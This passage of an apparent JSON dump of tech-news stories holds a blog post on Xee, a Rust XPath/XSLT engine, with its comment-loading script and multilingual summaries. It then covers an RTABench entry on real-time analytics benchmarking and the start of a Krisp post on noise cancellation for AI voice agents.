that\nrelatively rare bird who knows a fancy modern programming language like Rust,\nand is at the same time very familiar with XML.\n\nXPath and XSLT are programming languages\nSo XPath and XSLT are both programming languages.\nXPath is a query language for XML. Given an XML document, let's say something\nlike HTML, you can query it with expressions like: /html/body//p to get all\np elements inside the body element of the outer html element. XPath in\nits modern incarnation is a functional programming language with a type system,\nvariables, function definition, conditionals, loops and so on.\nXSLT is a transformation language for XML. It describes, using templates and a\nfunctional approach, how to transform an XML document of one type into another.\nYou can for instance use it to transform docbook XML, which describes\ndocuments, into HTML. It builds on XPath - XPath expressions are the expression\nlanguage of XSLT. XSLT itself also supports programming constructs like\nvariables, loops, conditionals, functions and the like, in a partial\nduplication of XPath.\n\nState of the XML open source stack\nSo if you want to use these programming languages and you use an open source\nstack, where do you go?\nThe Java world has good modern XPath and XSLT support. XPath and XSLT are\nimplemented by Saxon, which has been around for a long time. Saxon is available\non .NET as well. There are also PHP and Python bindings via a rather complex C\nto Java bridge, and Saxon offers a JavaScript reimplemention of its runtime as\nwell. Besides its open source offerings, Saxon also has closed-source\nprofessional/enterprise editions which provide more features. Besides Saxon,\nthere are also open source XQuery3 implementations in Java.\nBut if you step out of the Java world and its periphery, and if you look in\nyour average open source stack or Linux distribution for an XPath or XSLT\nimplementation you don't find Saxon or these XQuery databases; you find\nlibxml2 and libxslt.\nlibxml2 and libxslt are C libraries for handling XML. This amalgam of\nlibraries supports parsing XML, querying it using XPath, transforming it using\nXSLT and more. libxml2 is everywhere - in your Linux distribution and in\nMacOS. People don't just use it from C code - for Python for instance I built\nlxml on top.\nThese libraries were originally created by Daniel\nVeillard. I remember speaking to him once, many years\nago. We came from different worlds - he was thinking about writing fast\nprocessor-cache friendly code in C, whereas I was interested in an easy to use\nAPI in Python. I was impressed he had implemented all these specifications -\nlxml was merely piggybacking on that hard work.\nBut libxml2 is stuck in the past - it implements XPath, but only XPath 1.0,\nand similarly libxslt implements XSLT 1.0 only. These are specifications from\n1999. The XPath 2 specification was released in 2007, and we're currently\nactually at XPath 3.1, released in 2017. Similarly XSLT 2.0 was released in\n2007 and XSLT 3.0, the current version, in 2017.\nMy hope is that Xee can be a more modern alternative to libxml2 and libxslt\nthat finds its home in the open source world. For XPath and XSLT to be thriving\nstandards they need multiple implementations, in multiple programming\nlanguages, by multiple parties.\nAnd personally I feel like I have come full circle - finally, in these latter\ndays of XML, I am where Daniel Veillard had gone ages before with libxml2. I\nfind myself implementing the same stuff, not in C, but still in a systems\nprogramming language, Rust.\n\nSpecification culture\nI was at XML Prague, an XML conference, last year,\nand I noticed something interesting about XML culture. It is still very\nstandards focused. This was a very prevalent attitude in the web development\nworld in the early 2000s, but I think that although standards are still\nconsidered important today, they're less culturally prominent.\nThe XML culture is different: stuff needs to be specified. If it's not in a\nspecification it's not fully real. This makes the XML community move more\nslowly than the rest of the software community. I was somewhat bemused to hear\ntalk in 2024 about updating the RESTXQ spec, an XQuery based web framework\nstandard, first discussed in 2012, to make use of language features like\nhashmaps and arrays, now that they had been finally added to XPath/XQuery in\n2017.\nThese XML specifications go deep, they build on each other, they are solid. If\nyou value solid foundations that will stand the test of time, the XML world has\ngot your back.\n\nImplementing a programming language\nYou might be bored with XML by now so before I return to the discussion of\nspecifications, I will talk a bit about the architecture of Xee.\nXee follows various familiar patterns in the implementation of programming\nlanguages. I based part of its architecture on the excellent book Crafting\nInterpreters.\nIn Xee, XPath gets lexed into tokens, then parsed into an abstract syntax tree\n(AST). The AST is then transformed into an intermediate representation (IR)\nthat represents the expression in a more compact way. This IR is then compiled\ninto bytecode - a simple assembly-language like stack machine, similar to the\none that underlies many programming languages such as Python and Java. The Xee\ninterpreter can then execute the bytecode.\nThis translation at present is straightforward; while I've prepared the IR to\nsupport optimization passes such as constant folding and the like, this doesn't\nhappen yet.4\nXSLT, though unfinished, is built on the same architecture as the XPath engine.\nThere's a frontend that transforms XSLT XML into an XSLT AST, and then this is\ntransformed into the same IR as the one used for XPath. It uses the same\nbytecode intepreter. So, only the XSLT frontend is different, everything else\nis the same. This made it easy to implement a whole bunch of XSLT features as I\nhad already implemented them for XPath.\nImplementing programming languages is fun!\n\nSpecifications, again\nXPath and XSLT are programming languages that are fully specified. You can\nreally implement them from the specification. On the one hand this makes life a\nlot easier - the goals are clear as it's clearly specified how things are\nsupposed to work. There's a vast conformance test suite available as well. On\nthe other hand this means an endless treadmill; I can't just stop when I think\nit looks good enough when there's more specification left to implement.\nXPath 3.1 has grown a lot bigger than XPath 1.0; it became a full-fledged\nprogramming language, with a much larger standard library. XSLT 3.0 has also\nevolved a lot since XSLT 1.0. Specifications keep building on each other, and\nadd more features in new updates, until implementing them becomes a daunting\ntask. I sometimes I wish I was implementing XPath 1.0 and XSLT 1.0, like Daniel\nVeillard back in the day.\nLet me give you a quick tour of various specifications so you can understand\nsomething about the magnitude of the task of implementing them.\nThe grammar and behavior of the XPath language is laid out in the W3C\nspecification XML Xpath Language (XPath)\n3.1. This refers to another specification,\nXQuery and XPath Data Model 3.1\nwhich describes how XPath views XML data - what properties of XML data exist.\nIt also builds on another specification XPath and XQuery Functions and\nOperators 3.1, which not only\ndescribes the behavior of XPath operators such as +, - and *, but also\ndefines its standard library of functions.\nXPath has a type system, and its types are described by W3C XML Schema\nDefinition Language (XSD) 1.1: Part 1:\nStructures and W3C XML Schema\nDefinition Language (XSD) 1.1 Part 2:\nDatatypes. This defines atomic types\n(which Xee implements) but also lets you define new types and use types from an\nXML schema, which Xee doesn't implement at present. These specifications also\ndescribe how XPath is to parse and format strings of atomic types, such as the\nformat of decimals and dates.\nOh, and that XPath functions and operators specification? Some of the functions\nuse regular expressions. The specification defines XPath regular expressions as\nan extension of the regular expressions system defined in the XML schema\nspecification. And all of that builds on the unicode specification but that's\nanother country. So I ended up implementing a regex\nengine too.\nOver to XSLT. There's XSL Transformations (XSLT) Version\n3.0 which defines the XSLT programming\nlanguage. It builds on all the specifications that went before, and also builds\non XSLT and XQuery Serialization\n3.0, which describes\noptions for how to serialize XML and various other things.\nOf course all of this builds on the XML specification itself, Extensive Markup\nLanguage (XML) 1.0 (Fifth Edition), extended with\nnamespaces, in Namespaces in XML 1.0.\nThen there are a few stray specifications that are also relevant like XML\nBase and\nxml:id. But those are small ones.\nOnce I counted up the page count5 of just the XPath and XSLT\nspecifications along with the most relevant XML Schema spec (part 2), and that\nsubset is over 1800 pages.\nI probably forgot a few specifications, because after a while they start coming\nout of my ears, but this should give you an impression.\n\nXee status\nWhat I'm most proud of is the XPath 3.1 implementation in Xee. The XPath core\nlanguage and most of its standard library have been implemented. There are gaps\nin the standard library implementation still - some formatting functions are\nparticularly huge, for instance, but overall it's pretty complete.\nThere's an XPath 3.1 conformance test suite, and of the 21859 tests, 20130\ntests are passing at the time of writing. Most of the failing tests have to do\nwith the implementation of missing standard library functionality.\nIncidentally, this test suite runs those 20130 tests in 13 seconds on my\nmachine. Computers are fast.\nMeanwhile Xee also provides a solid basis for XSLT, reusing a lot of the XPath\ninfrastructure. While a lot of XSLT works, much remains to be done and I'm\nhoping to find people who want to help contribute!\n\nA call for contributors\nSo now I will call for this rare bird: someone who read all this, saw all those\nXML specifications, knows a bit of Rust, likes implementing programming\nlanguages and thought: cool! I want to help!\n\nDo you like the challenge of implementing some functionality, small or large,\naccording to spec? Xee has plenty of tasks for you.\n\nAre you interested in programming language implementation? Perhaps do cool\nprogramming language optimization work? For a programming language that has\nan existing user base already? Xee has the foundations.\n\nDo you like to think about query optimization problems? Care about using\nsuccinct data structures? (not\nintegrated into Xee proper yet). We have plenty of what should interest you.\n\nDo you care about the future of XML and want to ensure a modern open source\nimplementation is available outside of the Java world?\n\nThe Xee project could use your help and is ready for it. Small and large\ncontributions are possible and welcome!\n2\nI'm still hip. I say so. Even though I do XML stuff.\n\n1\nNot the same XSLT engine. Different ones!\n\n3\nXQuery is a superset of XPath.\n\n4\nSo you're interested in working on programming language\noptimization you've come to the right place!\n\n5\nI printed each specification HTML page to PDF to see how many pages\nthey were.\n\n                ←Prev\n                Looking for new challenges!\n\n  Comments\n  You can use your Mastodon account to reply to this post. Learn how\n  this is implemented here.\n\n  Reply\n  Load comments\n\n    Reply to this post\n\n      With an account on the Fediverse or Mastodon, you can respond to this\n      post. Since Mastodon is decentralized, you can use your existing account\n      hosted by another Mastodon server or compatible platform if you don't\n      have an account on this one.\n\n    Copy and paste this URL into the search field of your favorite Fediverse app or the web interface of your Mastodon server.\n\n      Copy\n      Close\n\n  You need JavaScript to view the comments.\n\n    const dialog = document.querySelector('dialog');\n\n    document.getElementById('replyButton').addEventListener('click', () => {\n       dialog.showModal();\n      });\n\n    document.getElementById('copyButton').addEventListener('click', () => {\n      navigator.clipboard.writeText(\"https://fosstodon.org/@faassen/114235009789423262\");\n    });\n\n    document.getElementById('cancelButton').addEventListener('click', () => {\n      dialog.close();\n    });\n\n    dialog.addEventListener('keydown', e => {\n      if (e.key === 'Escape') dialog.close();\n    });\n\n    function escapeHtml(unsafe) {\n      return unsafe\n            .replace(/&/g, \"&amp;\")\n            .replace(/</g, \"&lt;\")\n            .replace(/>/g, \"&gt;\")\n            .replace(/\"/g, \"&quot;\")\n            .replace(/'/g, \"&#039;\");\n    }\n\n    // render date as YYYY-MM-DD HH:MM, not using the browser's locale\n    function renderDate(date) {\n        return date.getFullYear() + \"-\" + (date.getMonth() + 1).toString().padStart(2, '0') + \"-\" + date.getDate().toString().padStart(2, '0') + \" \" + date.getHours().toString().padStart(2, '0') + \":\" + date.getMinutes().toString().padStart(2, '0');\n    }\n\n    document.getElementById(\"load-comment\").addEventListener(\"click\", function() {\n        document.getElementById(\"load-comment\").innerHTML = \"Loading\";\n        fetch('https://fosstodon.org/api/v1/statuses/114235009789423262/context')\n          .then(function(response) {\n            return response.json();\n          })\n          .then(function(data) {\n            if(data['descendants'] &&\n               Array.isArray(data['descendants']) &&\n              data['descendants'].length > 0) {\n                document.getElementById('mastodon-comments-list').innerHTML = \"\";\n                data['descendants'].forEach(function(reply) {\n                  reply.account.display_name = escapeHtml(reply.account.display_name);\n                  reply.account.reply_class = reply.in_reply_to_id == \"114235009789423262\" ? \"reply-original\" : \"reply-child\";\n                  reply.created_date = new Date(reply.created_at);\n                  reply.account.emojis.forEach(emoji => {\n                    reply.account.display_name = reply.account.display_name.replace(`:${emoji.shortcode}:`,\n                      `<img src=\"${escapeHtml(emoji.static_url)}\" alt=\"Emoji ${emoji.shortcode}\" height=\"20\" width=\"20\" />`);\n                  });\n                  mastodonComment =\n                    `\n<div class=\"mastodon-wrapper\">\n  <div class=\"comment-level ${reply.account.reply_class}\"><svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 512 512\">\n    <path fill=\"currentColor\" stroke=\"currentColor\" d=\"m 307,477.17986 c -11.5,-5.1 -19,-16.6 -19,-29.2 v -64 H 176 C 78.8,383.97986 -4.6936293e-8,305.17986 -4.6936293e-8,207.97986 -4.6936293e-8,94.679854 81.5,44.079854 100.2,33.879854 c 2.5,-1.4 5.3,-1.9 8.1,-1.9 10.9,0 19.7,8.9 19.7,19.7 0,7.5 -4.3,14.4 -9.8,19.5 -9.4,8.8 -22.2,26.4 -22.2,56.700006 0,53 43,96 96,96 h 96 v -64 c 0,-12.6 7.4,-24.1 19,-29.2 11.6,-5.1 25,-3 34.4,5.4 l 160,144 c 6.7,6.2 10.6,14.8 10.6,23.9 0,9.1 -3.9,17.7 -10.6,23.8 l -160,144 c -9.4,8.5 -22.9,10.6 -34.4,5.4 z\" />\n  </svg></div>\n  <div class=\"mastodon-comment\">\n    <div class=\"comment\">\n      <div class=\"comment-avatar\"><img src=\"${escapeHtml(reply.account.avatar_static)}\" alt=\"\"></div>\n      <div class=\"comment-author\">\n        <div class=\"comment-author-name\"><a href=\"${reply.account.url}\" rel=\"nofollow\">${reply.account.display_name}</a></div>\n        <div class=\"comment-author-reply\"><a href=\"${reply.account.url}\" rel=\"nofollow\">${escapeHtml(reply.account.acct)}</a></div>\n      </div>\n      <div class=\"meta\">${renderDate(reply.created_date)}</div>\n    </div>\n    <div class=\"comment-content\">${reply.content}</div>\n  </div>\n</div>\n`;\n                  document.getElementById('mastodon-comments-list').appendChild(DOMPurify.sanitize(mastodonComment, {'RETURN_DOM_FRAGMENT': true}));\n                });\n            } else {\n              document.getElementById('mastodon-comments-list').innerHTML = \"<p>No comments found</p>\";\n            }\n          });\n        });",
    "summary": {
      "en": "**Summary of Xee: A Modern XPath and XSLT Engine in Rust**\n\nXee is a programming language implementation in Rust that supports modern versions of XPath and XSLT, which are languages used for processing XML. The project started in 2023 with a client request and has evolved significantly since then. Xee includes a command-line tool for running XPath queries and a Rust library for issuing these queries.\n\n**Key Points:**\n\n- **What is Xee?** Xee implements XPath (a query language for XML) and XSLT (a transformation language for XML) using Rust, allowing integration with various programming languages.\n  \n- **Why is Xee Important?** It aims to modernize XML technology, as existing libraries like libxml2 and libxslt are outdated, only supporting older specifications from 1999. Xee targets modern standards (XPath 3.1 and XSLT 3.0), promoting a multi-language approach to XML processing.\n\n- **XML's Historical Context:** XML was popular in the early 2000s and remains widely used for data storage and document formats, despite newer technologies like JSON gaining traction.\n\n- **Implementation Details:** Xee uses a structured approach to implement programming languages, including tokenization, parsing, and compiling into bytecode. The XPath implementation is mostly complete, with a high passing rate on conformance tests.\n\n- **Call for Contributors:** The project seeks individuals familiar with Rust and interested in contributing to the development of Xee, whether through language implementation, optimization, or enhancing XML technology's future.\n\nOverall, Xee represents a modern effort to revitalize XML programming languages in the Rust ecosystem and welcomes community involvement for its advancement.",
      "ko": "Xee는 Rust로 구현된 프로그래밍 언어로, XML 처리를 위한 최신 버전의 XPath와 XSLT를 지원합니다. 이 프로젝트는 2023년에 클라이언트의 요청으로 시작되었으며, 그 이후로 크게 발전했습니다. Xee는 XPath 쿼리를 실행하기 위한 명령줄 도구와 이러한 쿼리를 발행하기 위한 Rust 라이브러리를 포함하고 있습니다.\n\nXee는 XML을 위한 쿼리 언어인 XPath와 XML 변환 언어인 XSLT를 Rust로 구현하여 다양한 프로그래밍 언어와 통합할 수 있도록 합니다. 이 프로젝트는 XML 기술을 현대화하는 것을 목표로 하고 있으며, 기존의 libxml2와 libxslt와 같은 라이브러리는 1999년의 구식 사양만 지원하고 있어 그 필요성이 커지고 있습니다. Xee는 최신 표준인 XPath 3.1과 XSLT 3.0을 목표로 하여 XML 처리에 대한 다국어 접근 방식을 촉진합니다.\n\nXML은 2000년대 초반에 인기를 끌었으며, 데이터 저장 및 문서 형식으로 널리 사용되고 있습니다. 비록 JSON과 같은 새로운 기술이 주목받고 있지만, XML은 여전히 중요한 역할을 하고 있습니다.\n\nXee는 프로그래밍 언어를 구현하기 위해 구조화된 접근 방식을 사용하며, 여기에는 토큰화, 파싱, 바이트코드로의 컴파일이 포함됩니다. XPath 구현은 대부분 완료되었으며, 적합성 테스트에서 높은 통과율을 기록하고 있습니다.\n\n이 프로젝트는 Rust에 익숙하고 Xee 개발에 기여하고자 하는 사람들을 찾고 있습니다. 기여는 언어 구현, 최적화, XML 기술의 미래를 향상시키는 다양한 방식으로 이루어질 수 있습니다. Xee는 Rust 생태계에서 XML 프로그래밍 언어를 현대화하려는 노력을 대표하며, 커뮤니티의 참여를 환영합니다.",
      "ja": "Xeeは、XML処理に使用されるXPathとXSLTの最新バージョンをサポートするRustで実装されたプログラミング言語です。このプロジェクトは2023年にクライアントからの依頼を受けて始まり、その後大きく進化しました。XeeにはXPathクエリを実行するためのコマンドラインツールと、これらのクエリを発行するためのRustライブラリが含まれています。\n\nXeeは、XMLのクエリ言語であるXPathと、XMLの変換言語であるXSLTをRustで実装しており、さまざまなプログラミング言語との統合が可能です。Xeeの重要性は、既存のライブラリであるlibxml2やlibxsltが1999年の古い仕様しかサポートしていないため、XML技術を現代化することを目指している点にあります。Xeeは、XPath 3.1やXSLT 3.0といった最新の標準をターゲットにしており、XML処理における多言語アプローチを促進しています。\n\nXMLは2000年代初頭に人気があり、データストレージや文書フォーマットとして広く使用されていますが、JSONのような新しい技術も注目されています。Xeeは、プログラミング言語を実装するために構造化されたアプローチを採用しており、トークン化、パース、バイトコードへのコンパイルを含んでいます。XPathの実装はほぼ完成しており、適合性テストでも高い合格率を誇っています。\n\nこのプロジェクトは、Rustに精通し、Xeeの開発に貢献したいと考えている人々を募集しています。貢献の方法は、言語の実装や最適化、XML技術の未来を向上させることなど多岐にわたります。Xeeは、RustエコシステムにおけるXMLプログラミング言語の現代的な revitalizationを目指しており、コミュニティの参加を歓迎しています。"
    }
  },
  {
    "id": "e050176c443e4b2e",
    "title": {
      "en": "New open-source benchmark for real-time analytics applications",
      "ko": "실시간 분석 벤치마크 공개",
      "ja": "リアルタイム分析の新基準"
    },
    "type": "story",
    "url": "https://github.com/timescale/rtabench",
    "score": 16,
    "by": "thenoahhein",
    "time": 1743029854,
    "content": "RTABench\nA Benchmark for Real-Time Analytics Applications\nrtabench.com\nMotivation\nChoosing the right database for analytics is hard: there are many options, each optimized for different use cases. Benchmarks can help, but only if they reflect your actual workload.\nCommon analytics benchmarks tend to represent analytics workloads as:\n\nStore all data in a single, wide, denormalized table.\nRun full-table scans or large aggregations across long time periods.\nAre optimized for ad-hoc, exploratory queries rather than pre-defined application queries.\n\nThis approach works well for batch processing and historical analysis, but real-time analytics inside applications requires a different perspective. Instead of analyzing large datasets retrospectively, applications generate fast, targeted insights on fresh data for specific users, devices, or transactions. This leads to three key differences:\n\nQueries require joining multiple tables instead of using a single denormalized table.\nQueries are often highly selective, filtering on specific objects and time windows.\nPre-aggregated views are very often used for instant responses.\n\nThat is why we designed RTABench, to provide a benchmark that accurately reflects real-time analytics inside applications, with a normalized schema, realistic dataset sizes, and queries that match real-world usage patterns.\nOverview\nRTABench uses the Clickbench framework for benchmarking, but it introduces a new dataset and query set that better represents real-time analytics inside applications. All tools, datasets, and benchmark results are available on GitHub, where we welcome contributions for expanding RTABench to support additional databases and optimizations.\nLike any benchmark, RTABench results should not be viewed as a ranking of databases, but rather as a guide to understanding which system aligns best with your real-time analytics needs.\nDataset\nSchema\nA Normalized Data Model That Reflects Real Applications\nRTABench is based on an application that tracks products, orders, and shipments for an online store. Instead of a single table, it follows a normalized schema that reflects how most applications store and manage data:\n\ncustomers – stores information about people making orders.\nproducts – contains product catalog information, including prices and stock levels.\norders – tracks orders placed by customers.\norder_items – records which products were included in each order.\norder_events – tracks order status changes (e.g., created, shipped, delivered).\n\nThis multi-table schema ensures RTABench measures how well databases handle real-time analytics queries that require joins and filtering—a scenario missing from other analytics benchmarks.\nEvents\nRTABench includes a dataset with ~171 million events that is large enough to run performance benchmarks without making it impractical to be used and run easily and fast.\nThe benchmark also includes 1,102 customers, 9,255 products and 10,010,342 orders, ensuring RTABench can test query performance under realistic application workloads while remaining scalable for different database configurations.\nQueries\nMeasuring Real-Time Performance\nRTABench evaluates databases using 33 queries designed to reflect the analytics patterns commonly found in real-time applications. These queries assess query performance on normalized schemas, selective filtering, and incremental materialized views:\n\nRaw event queries – Counting, filtering, and aggregating events over time. (e.g., “Count the number of ‘Departed’ shipments per day at a specific terminal.”)\nSelective filtering – Querying specific objects and time windows to test indexing and partitioning efficiency. (e.g., “Find the last recorded status of a given order.”)\nMulti-table joins – Fetching related data across multiple tables to simulate real-world application queries. (e.g., “Show the total revenue generated by each customer in the last 30 days.”)\nPre-aggregated queries – Measuring how incremental materialized views improve response times by precomputing results. (e.g., “Retrieve pre-aggregated counts of delayed shipments over the last month.”)\n\nBy including both raw and pre-aggregated queries, RTABench ensures that databases are tested for both ad-hoc analytics and optimized real-time reporting, capturing the trade-offs between flexibility and performance.\nDatabase systems included\nRTABench evaluates databases that are commonly used for real-time analytics inside applications, where high-ingest rates, low-latency queries, and efficient joins are critical. Databases in the benchmark fall into three broad categories:\n\nGeneral-Purpose Databases: A transactional database that can handle many use cases and used as the primary database for an application. Most general-purpose databases, like PostgreSQL and MySQL, are capable of handling real-time analytics depending on scale and performance requirements\nReal-Time Analytics: A database optimized for real-time analytics with support for high ingest throughput, making data instantly available, fast analytical queries and high concurrency. Specialized real-time analytics databases are often used as a secondary database for an application.\nBatch Analytics Databases: These databases are optimized for large-scale historical analysis and batch processing, excelling at ad-hoc queries on static datasets rather than real-time, continuously updated data.\nAlthough Batch analytics databases are not designed for real-time analytics, we have included them in RTABench for developers interested in comparing their performance.\nBecause these databases cannot serve real-time analytics, they are not the focus of this benchmark. Their results are not shown by default, as the benchmark is not targeted at them.\nIt’s possible for a database to fall into multiple categories based on their capabilities.\n\nThe first version of the benchmark includes the databases listed below:\n\nDatabase\nGeneral-Purpose\nReal-Time\nBatch Analytics\n\nClickHouse\n\n✅\n✅\n\nClickHouse Cloud\n\n✅\n✅\n\nDuckDB\n\n✅\n\nMongoDB\n✅\n\nMySQL\n✅\n\nPostgreSQL\n✅\n\nPostgreSQL with TimescaleDB\n✅\n✅\n\nTimescale Cloud\n✅\n✅\n\nRules and contributions\nRTABench is an open-source benchmark, and we encourage the community to contribute by:\n\nAdding new databases to expand the comparison.\nImproving query optimizations for different systems.\nProviding feedback on configurations to ensure fairness.\n\nContributions can be made through GitHub, where all benchmark tooling, datasets, and results are publicly available.\nBy using Clickbench as the underlying framework, we inherit the same rules for adding new systems and results.\nOther projects\nClickbench\nIt compares analytical databases using clickstream data. This type of workload—common in web analytics, BI reporting, and log aggregation—favors single-table queries that scan large datasets to generate insights over long time ranges.\n\nhttps://github.com/ClickHouse/ClickBench\n\nTSBS\nTime Series Benchmark Suite is a benchmarking tool designed to evaluate the performance of time-series databases under realistic ingestion and query workloads.\n\nhttps://github.com/timescale/tsbs\n\nTPC-H\nA benchmark that measures the performance of analytical databases using a set of ad hoc business queries on a simplified schema. It evaluates the usecase of traditional data warehouses.\n\nhttps://www.tpc.org/tpch/\n\nTPC-DS\nAn evolution of TPC-H to provide a more realistic, complex, and comprehensive benchmark for modern decision support systems. It uses complex, business-oriented queries on large, multi-dimensional datasets. It's meant to evaluate data warehouse-like workloads (star/snowflake schema, fact/dimension tables)\n\nhttps://www.tpc.org/tpcds/",
    "summary": {
      "en": "**RTABench Summary**\n\nRTABench is a benchmarking tool designed to evaluate real-time analytics applications, addressing the challenges of selecting the right database for analytics. Traditional benchmarks often use a single wide table and focus on batch processing, which is not suitable for real-time needs. Real-time analytics requires:\n\n1. **Multiple Table Joins**: Queries typically involve joining several tables.\n2. **Selective Filtering**: Queries are focused on specific data points and timeframes.\n3. **Pre-aggregated Views**: Instant responses are often achieved through pre-computed data.\n\n**Key Features of RTABench**:\n\n- **Normalized Schema**: RTABench uses a structured data model reflecting real-world applications, such as an online store with tables for customers, products, orders, and order events.\n- **Realistic Dataset**: It includes approximately 171 million events, with detailed data on customers, products, and orders to test performance under realistic loads.\n- **Diverse Queries**: The benchmark evaluates 33 queries that mimic common analytics patterns in real-time applications, including raw event queries, selective filtering, multi-table joins, and pre-aggregated queries.\n\n**Database Categories Tested**:\n\n1. **General-Purpose Databases**: Such as PostgreSQL and MySQL, which can handle various use cases, including real-time analytics.\n2. **Real-Time Analytics Databases**: Optimized for fast querying and high data ingestion.\n3. **Batch Analytics Databases**: Focused on historical data analysis, included for comparative purposes but not the main focus of RTABench.\n\n**Community Contributions**: RTABench is open-source, allowing community members to add databases, improve queries, and provide feedback via GitHub.\n\nOverall, RTABench aims to provide a more accurate representation of real-time analytics needs compared to traditional benchmarks, fostering better database selection for specific application requirements.",
      "ko": "RTABench는 실시간 분석 애플리케이션을 평가하기 위해 설계된 벤치마크 도구로, 분석에 적합한 데이터베이스를 선택하는 데 필요한 문제를 해결합니다. 전통적인 벤치마크는 일반적으로 하나의 넓은 테이블을 사용하고 배치 처리에 중점을 두지만, 이는 실시간 요구 사항에 적합하지 않습니다. 실시간 분석에는 여러 가지 요소가 필요합니다.\n\n첫째, 여러 테이블을 조인하는 쿼리가 일반적입니다. 둘째, 쿼리는 특정 데이터 포인트와 시간대에 집중합니다. 셋째, 즉각적인 응답은 종종 미리 계산된 데이터를 통해 이루어집니다.\n\nRTABench의 주요 특징으로는 정규화된 스키마가 있습니다. RTABench는 고객, 제품, 주문 및 주문 이벤트에 대한 테이블을 포함한 온라인 상점과 같은 실제 애플리케이션을 반영하는 구조화된 데이터 모델을 사용합니다. 또한 약 1억 7천만 개의 이벤트를 포함한 현실적인 데이터 세트를 제공하여 고객, 제품 및 주문에 대한 상세 데이터를 통해 실제 부하에서 성능을 테스트할 수 있습니다. 이 벤치마크는 원시 이벤트 쿼리, 선택적 필터링, 다중 테이블 조인 및 미리 집계된 쿼리를 포함하여 실시간 애플리케이션에서 일반적인 분석 패턴을 모방한 33개의 쿼리를 평가합니다.\n\n테스트되는 데이터베이스 카테고리는 세 가지로 나뉩니다. 첫째, PostgreSQL과 MySQL과 같은 일반 목적 데이터베이스로, 다양한 사용 사례를 처리할 수 있으며 실시간 분석도 포함됩니다. 둘째, 빠른 쿼리와 높은 데이터 수집을 위해 최적화된 실시간 분석 데이터베이스입니다. 셋째, 역사적 데이터 분석에 중점을 둔 배치 분석 데이터베이스로, 비교 목적으로 포함되지만 RTABench의 주요 초점은 아닙니다.\n\nRTABench는 오픈 소스 프로젝트로, 커뮤니티 구성원들이 데이터베이스를 추가하고 쿼리를 개선하며 GitHub를 통해 피드백을 제공할 수 있습니다. 전반적으로 RTABench는 전통적인 벤치마크에 비해 실시간 분석 요구 사항을 보다 정확하게 반영하여 특정 애플리케이션 요구에 맞는 데이터베이스 선택을 촉진하는 것을 목표로 하고 있습니다.",
      "ja": "RTABenchは、リアルタイム分析アプリケーションを評価するためのベンチマークツールです。このツールは、分析に適したデータベースを選ぶ際の課題に対応しています。従来のベンチマークは、単一の広いテーブルを使用し、バッチ処理に焦点を当てることが多く、リアルタイムのニーズには適していません。リアルタイム分析には、複数のテーブルを結合すること、特定のデータポイントや時間枠に基づく選択的なフィルタリング、事前に集計されたビューを通じて瞬時の応答を得ることが求められます。\n\nRTABenchの主な特徴には、正規化されたスキーマがあります。これは、顧客、商品、注文、注文イベントのテーブルを持つオンラインストアなど、実際のアプリケーションを反映した構造化データモデルを使用しています。また、約1億7100万件のイベントを含む現実的なデータセットがあり、顧客、商品、注文に関する詳細なデータを提供し、現実的な負荷の下でのパフォーマンスをテストします。さらに、ベンチマークは、リアルタイムアプリケーションにおける一般的な分析パターンを模倣した33のクエリを評価し、生のイベントクエリ、選択的フィルタリング、複数テーブルの結合、事前集計クエリを含んでいます。\n\nテストされるデータベースのカテゴリには、一般的な用途向けのデータベース（PostgreSQLやMySQLなど）、リアルタイム分析に最適化されたデータベース、高速なクエリ処理と高いデータ取り込みを実現するためのリアルタイム分析データベース、歴史的データ分析に焦点を当てたバッチ分析データベースが含まれています。後者は比較のために含まれていますが、RTABenchの主な焦点ではありません。\n\nRTABenchはオープンソースであり、コミュニティのメンバーがデータベースを追加したり、クエリを改善したり、GitHubを通じてフィードバックを提供することができます。全体として、RTABenchは従来のベンチマークに比べてリアルタイム分析のニーズをより正確に表現し、特定のアプリケーション要件に適したデータベースの選択を促進することを目指しています。"
    }
  },
  {
    "id": "9df294c642beb2bc",
    "title": {
      "en": "Noise cancellation improves turn-taking for AI Voice Agents",
      "ko": "소음 제거로 AI 음성 대화 개선",
      "ja": "AI音声エージェントの進化"
    },
    "type": "story",
    "url": "https://krisp.ai/blog/improving-turn-taking-of-ai-voice-agents-with-background-voice-cancellation/",
    "score": 109,
    "by": "davitb",
    "time": 1742874977,
    "content": "Table of contents\n\n            Turn-Taking is a big challengeIntroducing Krisp Server SDK for AI Voice AgentsQuantifying the Krisp BVC ImpactImpact on Turn-TakingImpact on Speech Recognition Accuracy (WER)\n\n        Home / Company / Engineering Blog / Improving Turn-Taking of AI Voice Agents with Background Noise and Voice Cancellation\n\n                Engineering Blog\n\n                SDK\n\n        Improving Turn-Taking of AI Voice Agents with Background Noise and Voice Cancellation\n        Mar 24, 2025\n\n                    Written by Krisp Engineering Team\n\n            Turn-Taking is a big challengeIntroducing Krisp Server SDK for AI Voice AgentsQuantifying the Krisp BVC ImpactImpact on Turn-TakingImpact on Speech Recognition Accuracy (WER)\n\n                Get Started with Krisp AI Meeting Assistant:\n        Free Unlimited Meeting TranscriptionsAI-Powered Meeting Note TakerBot-free Meeting Recording Mode\n\n            Get Krisp for Free\n\n        Spread the word\n\n                                Turn-Taking is a big challenge\nAI Voice Agents are rapidly evolving, powering critical use-cases such as customer support automation, virtual assistants, gaming, and remote collaboration platforms. For these voice-driven interactions to feel natural and practical, the underlying audio pipeline must be resilient to noise, responsive, and accurate—especially in real-time scenarios.\n\nIn a typical deployment, audio streams originate from diverse endpoints like mobile applications, web browsers, or traditional telephony and are delivered via real-time communication protocols like WebRTC or WebSockets (WSS). This audio is aggregated and managed through specialized providers like LiveKit, Daily, or Agora, which ensure reliable, low-latency audio transport to the server-side pipeline.\n\nWithin the server pipeline, once the audio arrives, it undergoes optional preprocessing steps for formatting or basic adjustments, after which it moves directly into a Voice Activity Detection (VAD).\nVAD identifies active speech segments, driving automatic end-pointing and intelligent interruption handling. Following a user speech, when VAD detects silence, relevant API events trigger downstream Voice AI models to generate and deliver responses. If the user resumes speaking during the voice bot’s response generation, the pipeline seamlessly cancels the ongoing output and clears buffers, ensuring natural conversational turn-taking.\n\nIn this scenario, background noises—such as music, traffic sounds, TVs, or nearby conversations—remain embedded within the audio stream, reaching the VAD module unfiltered. Because VAD is designed to detect human speech activity, these background sounds often cause false-positive speech detections. As a result, the VAD mistakenly interprets noise or background voices as active user speech, triggering unintended interruptions. These false triggers negatively impact turn-taking, a core component of natural, human-like conversational interactions.\n\nHere, by placing Krisp Background Voice and Noise Cancellation before the VAD, the pipeline substantially reduces false-positive triggers and prevents interruptions from common background distractions.\n\nAdditionally, 